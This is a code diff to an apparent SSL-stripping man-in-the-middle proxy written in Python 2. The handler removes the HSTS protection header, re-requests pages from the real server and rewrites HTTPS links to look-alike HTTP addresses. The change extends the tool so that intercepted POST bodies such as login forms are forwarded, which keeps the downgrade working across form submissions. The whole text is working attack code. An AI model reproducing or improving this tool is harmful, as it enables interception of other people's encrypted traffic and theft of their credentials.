@@ -72,13 +72,12 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 		print "\n[+]Original Body:"
 		print req_body
 
-    def response_handler(self, req, req_body, res, res_body, scheme, netloc, path):
+    def response_handler(self, req, req_body, res, res_body, scheme, netloc, path, method):
 	print "\n----------------------------[Response]--------------------------------"
 	if res.headers:
 		modified = False
 		#Protection Headers to Strip
 		protection_headers = ['Strict-Transport-Security']
-
 		print "\n[+] Original Headers:"
 		print res.headers
 		print
@@ -105,9 +104,14 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 		print "\n[+] Original Body:"
 		print res_body
 		try:
-			fake_body = urllib2.urlopen("{}://{}{}".format(scheme, netloc, path)).read()
-			res_body = fake_body.replace("https://","http://w")
-		except:
+			if method == "POST":
+				fake_body = urllib2.urlopen("{}://{}{}".format(scheme, netloc, path), data=req_body).read()
+				res_body = fake_body.replace("https://", "http://w")
+			else:
+				fake_body = urllib2.urlopen("{}://{}{}".format(scheme, netloc, path)).read()
+				res_body = fake_body.replace("https://","http://w")
+		except Exception as e:
+			print "Exception caught: {}".format(e)
 			res_body = res_body.replace("https://","http://w")
 		print "\n[+] Modified Body:"
 		print res_body.replace("https://","http://w")
